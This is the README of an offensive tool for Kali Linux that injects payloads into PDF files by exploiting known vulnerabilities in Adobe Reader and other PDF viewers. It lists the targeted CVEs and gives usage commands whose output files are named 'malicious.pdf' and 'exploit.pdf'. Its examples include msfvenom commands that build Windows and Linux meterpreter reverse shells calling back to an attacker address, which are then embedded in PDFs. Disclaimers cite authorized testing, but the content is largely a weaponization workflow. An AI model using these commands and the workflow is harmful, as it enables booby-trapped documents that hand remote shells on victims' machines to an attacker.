# PDF Payload Injector Tool for Kali Linux

## ⚠️ IMPORTANT DISCLAIMER

**This tool is intended for educational purposes and authorized security testing only.**

- Use only on systems you own or have explicit permission to test
- Unauthorized use of this tool is illegal and unethical
- Ensure compliance with all applicable laws and regulations
- Obtain proper authorization before conducting any security testing
- The authors assume no liability for misuse of this tool

## Overview

This tool allows security researchers to embed payloads into existing PDF files using known vulnerabilities in PDF viewers and document processors. It incorporates CVE data and Exploit Database information to leverage known vulnerabilities.

## Features

- **OS Detection**: Automatically detects target OS and selects appropriate payload
- **CVE Database Integration**: Uses known vulnerabilities from CVE database
- **Exploit Database Integration**: Incorporates exploits from Exploit-DB
- **Multiple Payload Types**: 
  - Windows executables (.exe)
  - Linux scripts (.sh)
  - macOS payloads
  - Custom scripts
- **Rendering Vulnerabilities**: Exploits for PDF rendering engines
- **Custom Script Support**: Users can insert their own scripts

## Requirements

- Kali Linux or similar penetration testing distribution
- Python 3.7+
- Required Python packages (install via pip)
- PDF manipulation libraries
- Metasploit Framework (optional, for payload generation)

## Installation

```bash
# Clone or extract the tool
cd pdf_payload_injector

# Install dependencies
pip install -r requirements.txt

# Make scripts executable
chmod +x pdf_injector.py
chmod +x modules/*.py
```

## Usage

### Basic Usage

```bash
python3 pdf_injector.py --input original.pdf --output malicious.pdf --payload shell.exe --target windows
```

### Advanced Usage

```bash
# Interactive mode
python3 pdf_injector.py --interactive

# Use specific CVE
python3 pdf_injector.py --input doc.pdf --output exploit.pdf --cve CVE-2023-1234 --payload payload.exe

# Use Exploit-DB reference
python3 pdf_injector.py --input doc.pdf --output exploit.pdf --edb EDB-ID-12345 --payload script.sh

# Custom script insertion
python3 pdf_injector.py --input doc.pdf --output custom.pdf --custom-script my_script.js
```

### Options

- `--input`: Input PDF file
- `--output`: Output PDF file
- `--payload`: Payload file to embed
- `--target`: Target OS (windows/linux/macos)
- `--cve`: Use specific CVE vulnerability
- `--edb`: Use specific Exploit-DB vulnerability
- `--custom-script`: Insert custom JavaScript
- `--list-vulns`: List available vulnerabilities
- `--interactive`: Interactive mode
- `--config`: Use configuration file

## Configuration

Edit `config.json` to customize default settings:

```json
{
  "default_target": "windows",
  "payload_directory": "./payloads",
  "output_directory": "./output",
  "logging": true,
  "log_file": "pdf_injector.log"
}
```

## Supported Vulnerabilities

### Adobe Reader
- CVE-2010-0188 (libTiff)
- CVE-2010-2883 (Util.printf)
- CVE-2011-2462 (U3D)
- CVE-2013-0641 (JavaScript API)
- CVE-2018-4990 (Acrobat JavaScript)

### Other PDF Viewers
- Foxit Reader vulnerabilities
- Sumatra PDF vulnerabilities
- PDF-XChange vulnerabilities

### Rendering Engine Exploits
- JavaScript rendering bugs
- Font rendering vulnerabilities
- Image parsing exploits

## Examples

### Windows Payload Injection
```bash
# Create a reverse shell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Inject into PDF
python3 pdf_injector.py --input report.pdf --output exploit.pdf --payload shell.exe --target windows --cve CVE-2010-0188
```

### Linux Payload Injection
```bash
# Create Linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Inject into PDF
python3 pdf_injector.py --input document.pdf --output exploit.pdf --payload shell.elf --target linux
```

### Custom JavaScript
```bash
python3 pdf_injector.py --input doc.pdf --output custom.pdf --custom-script malicious.js
```

## Directory Structure

```
pdf_payload_injector/
├── pdf_injector.py          # Main script
├── config.json              # Configuration file
├── requirements.txt         # Python dependencies
├── README.md               # This file
├── modules/
│   ├── __init__.py
│   ├── cve_database.py      # CVE vulnerability database
│   ├── exploit_db.py        # Exploit-DB integration
│   ├── payload_embedder.py  # Payload embedding functions
│   ├── pdf_parser.py        # PDF parsing utilities
│   └── vuln_modules.py      # Vulnerability implementations
├── payloads/               # Payload storage directory
├── output/                 # Output files directory
└── logs/                   # Log files directory
```

## Safety and Ethical Use

1. **Authorization Only**: Use only with explicit permission
2. **Controlled Environment**: Test in isolated lab environments
3. **Non-Production**: Never use on production systems
4. **Legal Compliance**: Follow all applicable laws
5. **Responsible Disclosure**: Report vulnerabilities to vendors

## Detection and Prevention

This tool helps organizations:
- Test PDF security controls
- Validate email filtering systems
- Assess endpoint protection
- Train security teams

## Troubleshooting

### Common Issues

1. **PDF Parsing Errors**: Ensure the input PDF is not corrupted
2. **Payload Too Large**: Some PDF viewers have size limitations
3. **Antivirus Detection**: Legitimate security tools may flag generated files

### Debug Mode

```bash
python3 pdf_injector.py --debug --input doc.pdf --output exploit.pdf --payload shell.exe
```

## Contributing

Contributions are welcome from security researchers:
- Submit new vulnerability modules
- Improve existing exploits
- Add new payload types
- Enhance documentation

## Legal Notice

This tool is provided for educational and authorized security testing purposes only. Users are solely responsible for ensuring compliance with all applicable laws and regulations. The authors assume no liability for any misuse or damage caused by this tool.

## Version

- **Version**: 1.0.0
- **Last Updated**: 2024
- **Platform**: Kali Linux

## Contact

For questions, issues, or responsible vulnerability disclosure, contact the security team.